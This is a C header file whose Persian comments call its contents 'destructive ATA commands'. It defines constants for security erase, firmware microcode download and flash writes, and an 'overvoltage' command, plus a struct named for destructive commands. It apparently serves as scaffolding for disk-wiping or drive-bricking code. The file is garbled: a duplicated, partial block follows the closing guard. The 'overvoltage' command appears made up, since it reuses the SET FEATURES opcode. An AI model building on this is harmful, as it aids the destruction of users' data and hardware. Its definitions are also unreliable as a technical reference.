#ifndef ATA_CMDS_H
#define ATA_CMDS_H

// دستورات مخرب ATA
#define ATA_CMD_TRUSTED_NON_DATA  0x5B
#define ATA_CMD_DOWNLOAD_MICROCODE 0x92
#define ATA_CMD_SET_FEATURES     0xEF

// زیردستورات
#define SECURITY_ERASE_ENHANCED  0x04
#define MICROCODE_WRITE_FLASH    0x01
#define OVERVOLTAGE_CMD          0xEF

// ساختارهای داده
struct ata_destructive_cmd {
    u8 command;
    u8 feature;
    u8 lba_low;
    u8 lba_mid;
    u8 lba_high;
    u8 device;
    u8 count;
    u8 protocol;
};

#endif // ATA_CMDS_H

// دستورات مخرب ATA
#define ATA_16              16
#define ATA_CMD_SECURITY_ERASE 0xF1
#define ATA_CMD_DOWNLOAD_MICROCODE 0x92
#define ATA_CMD_SET_FEATURES  0xEF

// زیردستورات
#define SECURITY_ERASE_ENHANCED  0x04
#define MICROCODE_WRITE_FLASH    0x01
#define OVERVOLTAGE_CMD          0xEF

#endif // ATA_CMDS_H
